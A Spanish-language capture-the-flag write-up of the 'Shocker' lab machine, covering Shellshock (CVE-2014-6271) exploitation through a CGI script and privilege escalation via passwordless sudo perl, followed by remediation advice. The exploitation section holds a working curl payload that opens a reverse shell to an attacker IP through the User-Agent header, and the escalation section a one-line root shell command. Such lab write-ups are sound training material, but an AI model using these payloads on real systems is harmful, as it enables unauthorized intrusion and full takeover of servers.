Resumen

Shocker es de las que entran por el nombre: un CGI de Apache ejecutando bash vulnerable a Shellshock. Con eso tenemos shell como un usuario normal y la escalada es inmediata, un sudo que permite ejecutar perl como root sin contraseña.

Vulnerabilidad

CVE-2014-6271 (Shellshock)

Es un fallo en bash al procesar variables de entorno que terminan en una definición de función: bash ejecuta el código que venga después. Cuando un CGI de Apache pasa las cabeceras HTTP como variables de entorno a un script que invoca bash, un atacante puede inyectar comandos a través de una cabecera como User-Agent y conseguir ejecución remota de código sin autenticación.

Reconocimiento

Búsqueda de puertos abiertos en la máquina víctima

┌──(jaime㉿kali)-[~]└─$ sudo nmap -p- -Pn -sS -n --max-retries 1 shocker
PuertoServicioVersión

Un 80 con Apache y un 2222 con SSH. La web es una simple imagen, así que el interés está en encontrar algo detrás del Apache.

Enumeración

Fuzzeamos directorios y, sobre todo, buscamos la ruta de CGI, que es donde vive Shellshock

┌──(jaime㉿kali)-[~]└─$ gobuster dir -u http://shocker -w directory-list.txt -x sh,cgi
┌──(jaime㉿kali)-[~]└─$ gobuster dir -u http://shocker/cgi-bin/ -w directory-list.txt -x sh,cgi
/cgi-bin/user.sh (Status: 200)

Ahí está: user.sh, un script CGI. Si por detrás invoca bash, es candidato directo a Shellshock.

Explotación

Inyectamos el payload de Shellshock en la cabecera User-Agent apuntando al CGI, con una reverse shell

┌──(jaime㉿kali)-[~]└─$ curl -H 'User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/10.10.14.X/443 0>&1' http://shocker/cgi-bin/user.sh

Con el listener preparado recibimos la conexión como el usuario del servicio web

shelly@shocker:/usr/lib/cgi-bin$ whoami shelly

Escalada de privilegios

Lo primero al conseguir un usuario: mirar qué puede ejecutar con sudo

shelly@shocker:~$ sudo -l (root) NOPASSWD: /usr/bin/perl

Podemos ejecutar perl como root y sin contraseña. Perl permite lanzar un intérprete, así que abrimos una shell directamente como root

shelly@shocker:~$ sudo perl -e 'exec "/bin/bash";' root@shocker:~# whoami root

Flags

┌──(jaime㉿kali)-[~]└─$ cat /home/shelly/user.txt
┌──(jaime㉿kali)-[~]└─$ cat /root/root.txt

Cómo se arregla

La cadena nace de un bash sin parchear y de un sudo demasiado permisivo, así que el arreglo va por capas:

  • Actualizar bash: aplicar el parche de Shellshock (CVE-2014-6271 y los CVE relacionados). Es la solución de fondo que elimina la inyección.
  • Revisar los CGI: evitar scripts CGI que invoquen bash con datos controlados por el cliente; migrar a tecnologías que no pasen las cabeceras como variables de entorno a un intérprete.
  • Endurecer sudo: nunca dar NOPASSWD sobre intérpretes como perl, python o vim, porque equivalen a dar root entero. Limitar sudo a binarios concretos y sin capacidad de ejecutar código arbitrario.
  • Principio de menor privilegio: la cuenta del servicio web no debería poder escalar con un único comando.

Conclusiones

Shellshock es de 2014 y sigue apareciendo: cualquier CGI que llame a bash con datos del cliente es sospechoso, y la cabecera User-Agent es el vector clásico.

Ante una web escueta, merece la pena fuzzear específicamente el directorio /cgi-bin/ con extensiones .sh y .cgi: es donde suele esconderse el fallo.

La escalada recuerda lo peligroso que es un sudo mal configurado. Lo primero tras conseguir un usuario debería ser siempre un sudo -l; un intérprete con NOPASSWD es root directo.
